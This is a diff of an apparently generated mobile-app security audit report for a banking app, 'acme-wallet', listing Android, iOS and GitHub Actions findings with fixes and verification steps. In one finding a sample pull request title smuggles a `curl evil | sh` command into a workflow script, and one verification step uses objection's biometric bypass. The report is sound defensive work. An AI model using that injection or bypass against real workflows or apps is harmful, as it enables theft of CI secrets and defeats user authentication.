@@ -1,14 +1,14 @@
 # Security audit: acme-wallet
 
 - **Date:** 2026-01-01
-- **Scanner:** masaudit 0.3.0, rules 1.1.0
+- **Scanner:** masaudit 0.4.0, rules 2.0.0
 - **Platforms:** Android, iOS, CI/CD pipeline
 - **App profile:** banking (Banking, payments, wallets, crypto, lending, or insurance); MAS-L1+L2+R+P; from --app-type
 - **Code clues (suggestions only, not applied):**
   - Found a payment SDK (Stripe) in android/app/build.gradle.kts — ecommerce or banking may fit
   - Found biometric authentication in android/app/src/main/java/com/acme/wallet/WalletApi.kt — no type on its own; check biometric binding (Chapter 11)
 
-**Verdict: not ready to release.** 13 issues to fix before release for a banking app, plus 13 to fix soon.
+**Verdict: not ready to release.** 12 issues to fix before release for a banking app, plus 27 to fix soon.
 
 ## Top fixes
 
@@ -98,7 +98,7 @@ Matched line (masked):
 ref: ${{ github.event.pull_request.head.sha }}
 ```
 
-**Why it matters:** `pull_request_target` runs with your secrets and a write token even for pull requests from forks. Checking out and building the fork's code hands both to whoever opened the pull request, as happened to Ultralytics, Nx, and TanStack.
+**Why it matters:** `pull_request_target` runs with your secrets and a write token even for pull requests from forks. Checking out and building the fork's code hands both to whoever opened the pull request, as happened to Ultralytics, Nx, and TanStack. A job that keeps forks out is reported as high, or medium when no later step runs the checked-out code.
 
 **Fix:** Use `pull_request` for anything that builds or tests contributed code. If you need `pull_request_target`, never check out or run the fork's code in that job, and never let it write a cache or artifact another workflow uses.
 
@@ -187,35 +187,11 @@ Matched line (masked):
 
 **Effort:** minutes · **IDs:** MASWE-0027 · MASVS-NETWORK-1 · MASTG-TEST-0286 · **Book:** [§7.1](https://github.com/hossam9k/mobile-app-security/blob/main/book/03-data-in-transit.md#71-the-baseline)
 
-### 6. Third-party action is pinned to a tag or branch, not a commit SHA
-
-- **Rule:** `CI-001` · **Severity:** high · **Confidence:** High confidence
-- **Where:** `.github/workflows/release.yml:8`
-  - \`actions/checkout\` is pinned to \`v4\`, a tag or branch its owner can move to different code.
-
-Matched line (masked):
-
-```text
-- uses: actions/checkout@v4
-```
-
-**Why it matters:** A tag or branch is a label the action's owner can move to different code. In the tj-actions and Trivy attacks, moved tags ran stolen-secret code inside thousands of workflows that never changed a line.
-
-**Fix:** Replace the tag with the full 40-character commit SHA and keep the version in a trailing comment. Let a tool such as `pinact run` write the pin, and let Dependabot (with a cooldown) keep it current.
-
-```yaml
-- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-```
-
-**How to verify:** Run `pinact run --check` or zizmor's `unpinned-uses` audit: every remote `uses:` should end in a 40-character SHA.
-
-**Effort:** minutes · **IDs:** none · **Book:** [§15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)
-
-### 7. Untrusted event text is pasted into a run script
+### 6. Untrusted event text is pasted into a run script
 
 - **Rule:** `CI-004` · **Severity:** high · **Confidence:** High confidence
 - **Where:** `.github/workflows/release.yml:11`
-  - \`github.event.pull\_request.title\` is pasted into the script before it runs, so text an outsider controls can become shell commands.
+  - \`github.event.pull\_request.title\` is pasted into the script before it runs: text an outsider controls can become shell commands.
 
 Matched line (masked):
 
@@ -223,7 +199,7 @@ Matched line (masked):
 - run: echo "Building ${{ github.event.pull_request.title }}"
 ```
 
-**Why it matters:** GitHub replaces `${{ }}` before the shell runs, so a pull request title, issue body, or branch name becomes part of your script. A title such as `x"; curl evil | sh` then runs as your workflow, with its token and secrets.
+**Why it matters:** GitHub replaces `${{ }}` before the shell runs, so a pull request title, issue body, or branch name becomes part of your script. A title such as `x"; curl evil | sh` then runs as your workflow, with its token and secrets. Free-text dispatch inputs, which only writers can set, are reported as medium.
 
 **Fix:** Pass the value through `env:` and read it as a quoted shell variable, so it stays data.
 
@@ -241,7 +217,7 @@ Matched line (masked):
 
 **Effort:** minutes · **IDs:** none · **Book:** [§15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)
 
-### 8. App Transport Security is turned off
+### 7. App Transport Security is turned off
 
 - **Rule:** `IOS-001` · **Severity:** high · **Confidence:** High confidence
 - **Where:** `ios/AcmeWallet/Info.plist:9`
@@ -279,7 +255,7 @@ Matched line (masked):
 
 **Effort:** minutes · **IDs:** MASWE-0026 · MASVS-NETWORK-1 · MASTG-TEST-0322 · **Book:** [§7.1](https://github.com/hossam9k/mobile-app-security/blob/main/book/03-data-in-transit.md#71-the-baseline)
 
-### 9. Keychain item is readable before the first unlock
+### 8. Keychain item is readable before the first unlock
 
 - **Rule:** `IOS-008` · **Severity:** high · **Confidence:** High confidence
 - **Where:** `ios/AcmeWallet/TokenStore.swift:11`
@@ -310,11 +286,11 @@ let attributes: [String: Any] = [
 
 **Effort:** minutes · **IDs:** none · **Book:** [§4.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#44-data-protection-classes-the-decision-you-keep-getting-wrong)
 
-### 10. Exported component has no permission
+### 9. Exported component has no permission
 
 - **Rule:** `AND-015` · **Severity:** high · **Confidence:** Medium confidence (review it)
 - **Where:** `android/app/src/main/AndroidManifest.xml:14`
-  - The activity .TransferActivity is exported with no permission, so any app can call it.
+  - The activity .TransferActivity is exported with no permission: it has no intent filter, so any app can start it by its class name.
 
 Matched line (masked):
 
@@ -322,7 +298,7 @@ Matched line (masked):
 <activity android:name=".TransferActivity" android:exported="true" />
 ```
 
-**Why it matters:** Any app on the device can start an exported activity, service, receiver, or provider. Without a permission, a malicious app can skip your login screen or trigger the component's action directly.
+**Why it matters:** Any app on the device can start an exported activity, service, receiver, or provider. Without a permission, a malicious app can skip your login screen or trigger the component's action directly. A custom action next to public intent filters, or a widget or media receiver, is reported as medium.
 
 **Fix:** Set `android:exported="false"` unless other apps must reach the component. If they must, require a permission with `android:protectionLevel="signature"` and validate every input.
 
@@ -341,7 +317,7 @@ Matched line (masked):
 
 **Effort:** hours · **IDs:** MASWE-0018 · MASVS-AUTH-1 · MASTG-TEST-0364 · MASTG-TEST-0365 · MASTG-TEST-0366 · MASTG-TEST-0355 · **Book:** [§17.1](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#171-android-app-components-and-the-word-exported)
 
-### 11. AES in ECB mode, or with no mode named
+### 10. AES in ECB mode, or with no mode named
 
 - **Rule:** `XPL-004` · **Severity:** high · **Confidence:** High confidence
 - **Where:** `android/app/src/main/java/com/acme/wallet/WalletApi.kt:31`
@@ -387,7 +363,7 @@ fun decrypt(stored: ByteArray, key: SecretKey, aad: ByteArray): ByteArray {
 
 **Effort:** hours · **IDs:** MASWE-0007 · MASVS-CRYPTO-1 · MASTG-TEST-0232 · MASTG-TEST-0350 · MASTG-TEST-0317 · **Book:** [Chapter 0.2](https://github.com/hossam9k/mobile-app-security/blob/main/book/00-foundations.md#chapter-02-cryptography-you-actually-need)
 
-### 12. Biometric prompt is not tied to a key
+### 11. Biometric prompt is not tied to a key
 
 - **Rule:** `AND-025` · **Severity:** high · **Confidence:** Medium confidence (review it)
 - **Where:** `android/app/src/main/java/com/acme/wallet/WalletApi.kt:34`
@@ -421,7 +397,7 @@ BiometricPrompt(activity, ContextCompat.getMainExecutor(activity), callback)
 
 **Effort:** days · **IDs:** MASWE-0020 · MASVS-AUTH-2 · MASTG-TEST-0327 · MASTG-BEST-0036 · **Book:** [§11.1](https://github.com/hossam9k/mobile-app-security/blob/main/book/04-proving-who-is-calling.md#111-decorative-versus-real)
 
-### 13. Biometric check only flips a boolean
+### 12. Biometric check only flips a boolean
 
 - **Rule:** `IOS-012` · **Severity:** high · **Confidence:** Check by hand
 - **Where:** `ios/AcmeWallet/TokenStore.swift:18`
@@ -466,11 +442,11 @@ guard let signature = SecKeyCreateSignature(
 
 **How to verify:** Hook evaluatePolicy to report success (for example, `ios ui biometrics_bypass` in objection) and confirm the protected action still fails because no valid signature reaches the server.
 
-**Effort:** days · **IDs:** MASWE-0020 · MASVS-AUTH-2 · **Book:** [§11.1](https://github.com/hossam9k/mobile-app-security/blob/main/book/04-proving-who-is-calling.md#111-decorative-versus-real)
+**Effort:** days · **IDs:** MASWE-0020 · MASVS-AUTH-2 · MASTG-TEST-0266 · **Book:** [§11.1](https://github.com/hossam9k/mobile-app-security/blob/main/book/04-proving-who-is-calling.md#111-decorative-versus-real)
 
 ## Fix soon
 
-### 14. HTTP bodies are logged in every build
+### 13. HTTP bodies are logged in every build
 
 - **Rule:** `AND-030` · **Severity:** medium · **Confidence:** Medium confidence (review it)
 - **Where:** `android/app/src/main/java/com/acme/wallet/WalletApi.kt:20`
@@ -497,9 +473,33 @@ val logging = HttpLoggingInterceptor().apply {
 
 **Effort:** minutes · **IDs:** MASWE-0005 · MASVS-STORAGE-2 · MASTG-TEST-0203 · MASTG-TEST-0231 · **Book:** [§6.5](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#65-the-leaks-that-are-not-about-encryption)
 
+### 14. Action is pinned to a tag or branch, not a commit SHA
+
+- **Rule:** `CI-001` · **Severity:** medium (base: high) · **Confidence:** High confidence
+- **Where:** `.github/workflows/release.yml:8`
+  - \`actions/checkout\` is GitHub-owned but pinned to the tag \`v4\`, which GitHub can move. Lower risk than a third-party action, but pin it too. Rated medium for this case (below the rule's usual high); the finding says why.
+
+Matched line (masked):
+
+```text
+- uses: actions/checkout@v4
+```
+
+**Why it matters:** A tag or branch is a label the action's owner can move to different code. In the tj-actions and Trivy attacks, moved tags ran stolen-secret code inside thousands of workflows that never changed a line. GitHub-owned and same-organization actions are reported one level lower; this repository's own code goes to notes.
+
+**Fix:** Replace the tag with the full 40-character commit SHA and keep the version in a trailing comment. Let a tool such as `pinact run` write the pin, and let Dependabot (with a cooldown) keep it current. Reference this repository's own actions as `./…` or `$/…`.
+
+```yaml
+- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+```
+
+**How to verify:** Run `pinact run --check` or zizmor's `unpinned-uses` audit: every remote `uses:` in workflows and composite `action.yml` files should end in a 40-character SHA.
+
+**Effort:** minutes · **IDs:** none · **Book:** [§15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)
+
 ### 15. Workflow token permissions are not restricted
 
-- **Rule:** `CI-002` · **Severity:** medium · **Confidence:** High confidence
+- **Rule:** `CI-002` · **Severity:** medium · **Confidence:** Medium confidence (review it)
 - **Where:** `.github/workflows/release.yml:4`
   - No top-level \`permissions:\`, so jobs get the repository's default token, which is read-write on many older organizations.
 
@@ -540,7 +540,7 @@ Matched line (masked):
 
 **Why it matters:** By default `actions/checkout` leaves the job token in the workspace's git config (from v6, in a credentials file under `$RUNNER_TEMP` that `.git/config` includes). Every later step, including third-party actions and build scripts, can read it, and with older versions an uploaded artifact of the workspace can leak it.
 
-**Fix:** Set `persist-credentials: false` on every checkout. Only a job that pushes back to the repository needs the token, and it can pass it explicitly to that one command.
+**Fix:** Set `persist-credentials: false` on every checkout. Only a job that pushes back to the repository needs the token: set `persist-credentials: true` there on purpose, or pass the token to that one command.
 
 ```yaml
 - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
@@ -552,7 +552,32 @@ Matched line (masked):
 
 **Effort:** minutes · **IDs:** none · **Book:** [§15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)
 
-### 17. App Link is not verified
+### 17. Protected resource used without a usable purpose string
+
+- **Rule:** `IOS-038` · **Severity:** medium · **Confidence:** Medium confidence (review it)
+- **Where:** `ios/AcmeWallet/TokenStore.swift:18`
+  - This code asks for Face ID, and no shipping Info.plist or INFOPLIST\_KEY\_ setting has NSFaceIDUsageDescription; the request fails or the app is rejected.
+
+Matched line (masked):
+
+```text
+LAContext().evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
+```
+
+**Why it matters:** iOS shows the purpose string in the permission prompt. A missing key makes the request fail (or the app get rejected); an empty or placeholder text gives users no basis for an informed choice.
+
+**Fix:** Add the Info.plist usage key with a specific sentence that names the feature, such as "Scan a check to deposit it."
+
+```xml
+<key>NSCameraUsageDescription</key>
+<string>Scan the QR code on your card to link it to your account.</string>
+```
+
+**How to verify:** Reset privacy settings, trigger the feature, and confirm the prompt shows your specific explanation.
+
+**Effort:** minutes · **IDs:** MASWE-0066 · MASVS-PRIVACY-1 · MASTG-TEST-0360 · MASTG-BEST-0051 · **Book:** [§18.1](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#181-permissions-ask-for-less-later-and-explain-why)
+
+### 18. App Link is not verified
 
 - **Rule:** `AND-019` · **Severity:** medium · **Confidence:** Medium confidence (review it)
 - **Where:** `android/app/src/main/AndroidManifest.xml:16`
@@ -583,7 +608,7 @@ Matched line (masked):
 
 **Effort:** hours · **IDs:** MASWE-0029 · MASVS-PLATFORM-1 · MASTG-TEST-0393 · MASTG-BEST-0070 · **Book:** [§17.5](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#175-deep-links-and-the-verification-that-makes-them-safe)
 
-### 18. Backup is on with no exclusion rules
+### 19. Backup is on with no exclusion rules
 
 - **Rule:** `AND-021` · **Severity:** medium · **Confidence:** High confidence
 - **Where:** `android/app/src/main/AndroidManifest.xml:4`
@@ -630,7 +655,7 @@ Matched line (masked):
 
 **Effort:** hours · **IDs:** MASWE-0006 · MASVS-STORAGE-2 · MASTG-TEST-0216 · MASTG-TEST-0262 · **Book:** [§6.5](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#65-the-leaks-that-are-not-about-encryption)
 
-### 19. R8 is off in the release build
+### 20. R8 is off in the release build
 
 - **Rule:** `AND-027` · **Severity:** medium · **Confidence:** High confidence
 - **Where:** `android/app/build.gradle.kts:16`
@@ -666,7 +691,68 @@ android {
 
 **Effort:** hours · **IDs:** MASWE-0059 · MASVS-RESILIENCE-3 · MASTG-TEST-0368 · **Book:** [§14.1](https://github.com/hossam9k/mobile-app-security/blob/main/book/05-resilience.md#141-the-cheap-things-which-you-should-simply-do)
 
-### 20. Token or password stored in UserDefaults
+### 21. App never blocks screenshots or the recents thumbnail
+
+- **Rule:** `AND-045` · **Severity:** medium · **Confidence:** High confidence
+- **Where:** `android/app/src/main/AndroidManifest.xml:4`
+  - No screen gets FLAG\_SECURE (or SecureFlagPolicy.SecureOn), so screenshots, screen recording and the recents thumbnail can capture balances, card numbers or one-time codes.
+
+Matched line (masked):
+
+```text
+<application
+```
+
+**Why it matters:** Without `FLAG_SECURE`, screenshots, screen recording, casting and the recents-screen thumbnail capture whatever is on screen, including balances, card numbers and one-time codes.
+
+**Fix:** Set `FLAG_SECURE` on screens that show account data or codes, and `SecureFlagPolicy.SecureOn` on Compose dialogs that show secrets.
+
+```kotlin
+class StatementActivity : AppCompatActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE)
+    }
+}
+
+// Compose dialog that shows a one-time code
+Dialog(onDismissRequest = onDismiss, properties = DialogProperties(securePolicy = SecureFlagPolicy.SecureOn)) { OtpCard(code) }
+```
+
+**How to verify:** Open a sensitive screen, take a screenshot and open the recents screen; confirm both show a blank or blocked view.
+
+**Effort:** hours · **IDs:** MASWE-0038 · MASVS-PLATFORM-3 · MASTG-TEST-0291 · MASTG-BEST-0014 · MASTG-BEST-0016 · **Book:** [§6.5](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#65-the-leaks-that-are-not-about-encryption)
+
+### 22. App has no overlay (tapjacking) protection
+
+- **Rule:** `AND-046` · **Severity:** medium · **Confidence:** High confidence
+- **Where:** `android/app/src/main/AndroidManifest.xml:4`
+  - No screen filters touches when another window covers it (filterTouchesWhenObscured or setHideOverlayWindows), so a partial overlay can trick users into confirming actions. Android 12+ blocks most full overlays, but not partial ones.
+
+Matched line (masked):
+
+```text
+<application
+```
+
+**Why it matters:** Android 12+ blocks touches through most full-screen overlays from other apps, but not a partial overlay that covers everything except your button. A malicious overlay can then trick the user into approving a transfer or a permission.
+
+**Fix:** On sensitive screens, call `window.setHideOverlayWindows(true)` (API 31+, with the `HIDE_OVERLAY_WINDOWS` permission) and set `filterTouchesWhenObscured` on confirm and pay buttons.
+
+```kotlin
+// AndroidManifest.xml: <uses-permission android:name="android.permission.HIDE_OVERLAY_WINDOWS" />
+override fun onCreate(savedInstanceState: Bundle?) {
+    super.onCreate(savedInstanceState)
+    if (Build.VERSION.SDK_INT >= 31) window.setHideOverlayWindows(true)
+    binding.confirmTransfer.filterTouchesWhenObscured = true
+}
+```
+
+**How to verify:** Run a test app that draws a partial overlay over the confirm button and confirm the tap is ignored or the overlay is hidden.
+
+**Effort:** hours · **IDs:** MASWE-0039 · MASVS-PLATFORM-3 · MASTG-TEST-0340 · MASTG-BEST-0040 · **Book:** [§17.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#176-the-other-channels-people-forget)
+
+### 23. Token or password stored in UserDefaults
 
 - **Rule:** `IOS-011` · **Severity:** medium · **Confidence:** Check by hand
 - **Where:** `ios/AcmeWallet/TokenStore.swift:14`
@@ -678,7 +764,7 @@ Matched line (masked):
 UserDefaults.standard.set(token, forKey: "authToken")
 ```
 
-**Why it matters:** UserDefaults is a plain plist in the app container. It is copied into backups and is readable by anyone with access to the device's files. A long-lived token there can be lifted and replayed.
+**Why it matters:** UserDefaults is a plain plist in the app container (or in the shared App Group container for UserDefaults(suiteName:)). It is copied into backups and is readable by anyone with access to the device's files. A long-lived token there can be lifted and replayed.
 
 **Fix:** Keep short-lived tokens in memory. Store long-lived tokens and credentials in the Keychain with kSecAttrAccessibleWhenUnlockedThisDeviceOnly. Leave only non-secret settings in UserDefaults.
 
@@ -707,9 +793,37 @@ func storeToken(_ token: Data, account: String,
 
 **How to verify:** On the simulator, sign in, then run `grep -rl "eyJ" "$(xcrun simctl get_app_container booted <bundle id> data)/Library/Preferences"` and confirm there is no output. UserDefaults is a binary plist, so don't add `-I`. If your tokens aren't JWTs, search for a known part of one instead.
 
-**Effort:** hours · **IDs:** MASWE-0001 · MASVS-STORAGE-1 · MASTG-TEST-0300 · MASTG-TEST-0302 · **Book:** [§6.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#64-the-uncomfortable-question-nobody-asked)
+**Effort:** hours · **IDs:** MASWE-0001 · MASVS-STORAGE-1 · MASTG-TEST-0300 · MASTG-TEST-0302 · MASTG-TEST-0388 · **Book:** [§6.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#64-the-uncomfortable-question-nobody-asked)
 
-### 21. No certificate pinning (needed for high-risk apps)
+### 24. App never hides its screen in the app switcher or recordings
+
+- **Rule:** `IOS-030` · **Severity:** medium · **Confidence:** Medium confidence (review it)
+- **Where:** `ios/AcmeWallet/Info.plist`
+  - App ios never covers its screen when it goes to the background or is recorded (no sceneWillResignActive overlay, sceneCaptureState check or privacySensitive()), so the app switcher snapshot and screen recordings show whatever was on screen.
+
+**Why it matters:** iOS stores a snapshot of the last screen for the app switcher, and screen recording or mirroring shows everything live. Without an overlay, balances, messages or one-time codes stay visible there.
+
+**Fix:** Cover sensitive views in sceneWillResignActive and remove the cover in sceneDidBecomeActive, and watch sceneCaptureState (iOS 17+) to hide content while the screen is recorded.
+
+```swift
+func sceneWillResignActive(_ scene: UIScene) {
+    guard let window = (scene as? UIWindowScene)?.windows.first else { return }
+    let cover = UIVisualEffectView(effect: UIBlurEffect(style: .systemThickMaterial))
+    cover.frame = window.bounds
+    cover.tag = 0x5EC
+    window.addSubview(cover)
+}
+
+func sceneDidBecomeActive(_ scene: UIScene) {
+    (scene as? UIWindowScene)?.windows.first?.viewWithTag(0x5EC)?.removeFromSuperview()
+}
+```
+
+**How to verify:** Open a sensitive screen, swipe to the app switcher, and confirm the snapshot shows the cover; start a screen recording and confirm the content is hidden.
+
+**Effort:** hours · **IDs:** MASWE-0038 · MASVS-PLATFORM-3 · **Book:** [§6.5](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#65-the-leaks-that-are-not-about-encryption)
+
+### 25. No certificate pinning (needed for high-risk apps)
 
 - **Rule:** `AND-007` · **Severity:** medium · **Confidence:** Medium confidence (review it)
 - **Where:** `android/app/src/main/AndroidManifest.xml:4`
@@ -747,7 +861,7 @@ Matched line (masked):
 
 **Effort:** days · **IDs:** MASWE-0028 · MASVS-NETWORK-2 · MASTG-TEST-0242 · **Book:** [§8.8](https://github.com/hossam9k/mobile-app-security/blob/main/book/03-data-in-transit.md#88-the-decision-by-application-type)
 
-### 22. Deprecated EncryptedSharedPreferences (Jetpack Security)
+### 26. Deprecated EncryptedSharedPreferences (Jetpack Security)
 
 - **Rule:** `AND-022` · **Severity:** medium · **Confidence:** High confidence
 - **Where (2 places):**
@@ -780,7 +894,7 @@ dependencies {
 
 **Effort:** days · **IDs:** MASWE-0046 · MASVS-CODE-3 · **Book:** [§6.1](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#61-encryptedsharedpreferences-is-dead)
 
-### 23. targetSdk is below Google Play's requirement
+### 27. targetSdk is below Google Play's requirement
 
 - **Rule:** `AND-028` · **Severity:** medium · **Confidence:** High confidence
 - **Where:** `android/app/build.gradle.kts:12`
@@ -808,11 +922,31 @@ android {
 
 **Effort:** days · **IDs:** MASWE-0042 · MASVS-CODE-1 · **Book:** [§19.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#196-free-compiler-protections-and-platform-currency)
 
-### 24. No certificate pinning (needed for high-risk apps)
+### 28. Play Integrity is not integrated
+
+- **Rule:** `AND-048` · **Severity:** medium · **Confidence:** High confidence
+- **Where:** `android/app/src/main/AndroidManifest.xml:4`
+  - No Play Integrity integration found (no integrity dependency, IntegrityManager call, or App Check provider), so the backend can't tell this app from a modified copy or a script.
+
+Matched line (masked):
+
+```text
+<application
+```
+
+**Why it matters:** Without Play Integrity the backend can't tell a request from your genuine app on a genuine device from one sent by a modified APK, an emulator farm or a script.
+
+**Fix:** Request a standard Play Integrity token for sensitive actions and decide on the server (§9.3, §12.2).
+
+**How to verify:** Send a sensitive request from a re-signed build and confirm the server rejects it or lowers its trust score.
+
+**Effort:** days · **IDs:** MASWE-0056 · MASVS-RESILIENCE-2 · **Book:** [§9.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/04-proving-who-is-calling.md#96-how-to-implement-it)
+
+### 29. No certificate pinning (needed for high-risk apps)
 
 - **Rule:** `IOS-007` · **Severity:** medium · **Confidence:** Medium confidence (review it)
 - **Where:** `ios/AcmeWallet/Info.plist`
-  - No certificate pinning found: no NSPinnedDomains, TrustKit, or pin-checking URLSession delegate.
+  - No certificate pinning found for app ios: no NSPinnedDomains, TrustKit, or pin-checking URLSession delegate.
 
 **Why it matters:** Without pinning, any certificate from a CA the device trusts is accepted, including a root installed through a configuration profile or MDM. For money and health data, the book recommends SPKI pinning on an intermediate with a backup.
 
@@ -849,7 +983,54 @@ android {
 
 **Effort:** days · **IDs:** MASWE-0028 · MASVS-NETWORK-2 · MASTG-TEST-0385 · **Book:** [§8.8](https://github.com/hossam9k/mobile-app-security/blob/main/book/03-data-in-transit.md#88-the-decision-by-application-type)
 
-### 25. minSdk is below 24
+### 30. App Attest isn't integrated
+
+- **Rule:** `IOS-028` · **Severity:** medium · **Confidence:** High confidence
+- **Where:** `ios/AcmeWallet/Info.plist`
+  - App Attest isn't integrated in app ios (no DCAppAttestService, Firebase App Attest provider or attestation SDK), so the server can't tell your app from a modified copy or a script.
+
+**Why it matters:** Without App Attest, the server can't tell your genuine app from a repackaged copy, an emulator script or a bot replaying your API. DeviceCheck alone only flags devices, not the app.
+
+**Fix:** Generate and attest a key once per install with DCAppAttestService, send an assertion with sensitive requests, and verify both on the server.
+
+```swift
+import DeviceCheck
+
+let service = DCAppAttestService.shared
+guard service.isSupported else { return reportUnsupported() }
+let keyId = try await service.generateKey()
+let challenge = try await api.fetchAttestationChallenge()          // from your server
+let attestation = try await service.attestKey(keyId, clientDataHash: Data(SHA256.hash(data: challenge)))
+try await api.registerAttestation(keyId: keyId, attestation: attestation)
+// Later: service.generateAssertion(keyId, clientDataHash:) on sensitive requests.
+```
+
+**How to verify:** Call a sensitive endpoint with curl using a valid session and confirm the server rejects it for a missing or invalid assertion.
+
+**Effort:** days · **IDs:** MASWE-0056 · MASVS-RESILIENCE-2 · **Book:** [§10.7](https://github.com/hossam9k/mobile-app-security/blob/main/book/04-proving-who-is-calling.md#107-how-to-implement-it)
+
+### 31. App doesn't refuse third-party keyboards
+
+- **Rule:** `IOS-036` · **Severity:** low · **Confidence:** Medium confidence (review it)
+- **Where:** `ios/AcmeWallet/Info.plist`
+  - App ios never refuses third-party keyboards (no shouldAllowExtensionPointIdentifier returning false for .keyboard), so a keyboard with Full Access can log what users type.
+
+**Why it matters:** A third-party keyboard with Full Access can send everything typed into your app, including passwords and card numbers, to its developer. iOS disables custom keyboards only in secure text fields.
+
+**Fix:** Implement application(_:shouldAllowExtensionPointIdentifier:) and return false for .keyboard.
+
+```swift
+func application(_ application: UIApplication,
+                 shouldAllowExtensionPointIdentifier extensionPointIdentifier: UIApplication.ExtensionPointIdentifier) -> Bool {
+    extensionPointIdentifier != .keyboard
+}
+```
+
+**How to verify:** Install a third-party keyboard, open the app, and confirm only the system keyboard appears in every field.
+
+**Effort:** minutes · **IDs:** MASWE-0031 · MASVS-PLATFORM-1 · MASTG-TEST-0389 · MASTG-BEST-0069 · **Book:** [§17.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#176-the-other-channels-people-forget)
+
+### 32. minSdk is below 24
 
 - **Rule:** `AND-029` · **Severity:** low · **Confidence:** High confidence
 - **Where:** `android/app/build.gradle.kts:11`
@@ -876,6 +1057,126 @@ android {
 **How to verify:** Run `aapt2 dump badging app-release.apk | grep sdkVersion` and confirm it shows 24 or more.
 
 **Effort:** hours · **IDs:** MASWE-0041 · MASVS-CODE-1 · MASTG-TEST-0245 · MASTG-TEST-0285 · MASTG-BEST-0010 · **Book:** [§19.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#196-free-compiler-protections-and-platform-currency)
+
+### 33. No debugger detection found
+
+- **Rule:** `XPL-022` · **Severity:** low · **Confidence:** Medium confidence (review it)
+- **Where:** `android/app/src/main/AndroidManifest.xml:4`
+  - No debugger detection found in the Android app.
+
+Matched line (masked):
+
+```text
+<application
+```
+
+**Why it matters:** An attached debugger can read keys from memory and skip any client-side check. Without a debugger signal, the backend can't tell a tampered session from a normal one.
+
+**Fix:** Add JDWP and TracerPid checks on Android, and the `sysctl` P_TRACED check on iOS, to the signals you report, and run them during sensitive flows, not only at startup.
+
+**How to verify:** Attach a debugger to a release build and confirm the signal reaches the backend.
+
+**Effort:** hours · **IDs:** MASWE-0064 · MASVS-RESILIENCE-4 · MASTG-TEST-0352 · MASTG-TEST-0401 · MASTG-BEST-0047 · MASTG-BEST-0074 · **Book:** [§14.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/05-resilience.md#144-detection-in-code)
+
+### 34. App never checks that the device has a screen lock
+
+- **Rule:** `XPL-028` · **Severity:** low · **Confidence:** Medium confidence (review it)
+- **Where:** `android/app/src/main/AndroidManifest.xml:4`
+  - No check that the device has a screen lock found in the Android app.
+
+Matched line (masked):
+
+```text
+<application
+```
+
+**Why it matters:** On a device with no PIN, pattern, or passcode, the Keystore and Keychain protect nothing from someone holding the phone. Without a check, the app can't warn the user or bind secrets to the lock.
+
+**Fix:** Bind secrets to keys that need a screen lock (`setUserAuthenticationRequired`, `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`), and check `isDeviceSecure` or `canEvaluatePolicy`.
+
+**How to verify:** Remove the screen lock on a test device and confirm the app warns the user or refuses the sensitive feature.
+
+**Effort:** hours · **IDs:** MASWE-0017 · MASVS-CRYPTO-2 · MASTG-TEST-0247 · MASTG-TEST-0248 · **Book:** [§4.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#46-key-authorizations-the-conditions-the-hardware-enforces)
+
+### 35. No emulator detection found
+
+- **Rule:** `XPL-038` · **Severity:** low · **Confidence:** Medium confidence (review it)
+- **Where:** `android/app/src/main/AndroidManifest.xml:4`
+  - No emulator or simulator detection found in the Android app.
+
+Matched line (masked):
+
+```text
+<application
+```
+
+**Why it matters:** Fraud and cheating at scale run on emulators. Without an emulator signal, the backend can't tell a farm of virtual devices from real users.
+
+**Fix:** Add emulator signals (build fingerprint, hardware, `ro.kernel.qemu`; the iOS simulator environment) to the set you report, and rely on attestation for the strong signal.
+
+**How to verify:** Run a release build on an emulator and confirm the signal reaches the backend.
+
+**Effort:** hours · **IDs:** MASWE-0053 · MASVS-RESILIENCE-1 · MASTG-BEST-0046 · MASTG-BEST-0053 · **Book:** [§14.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/05-resilience.md#144-detection-in-code)
+
+### 36. No hooking or instrumentation detection found
+
+- **Rule:** `XPL-039` · **Severity:** low · **Confidence:** Medium confidence (review it)
+- **Where:** `android/app/src/main/AndroidManifest.xml:4`
+  - No hooking or instrumentation detection found in the Android app.
+
+Matched line (masked):
+
+```text
+<application
+```
+
+**Why it matters:** Frida, Xposed, and Substrate rewrite the app's checks at runtime. Without a hooking signal, the backend trusts results that the attacker computed.
+
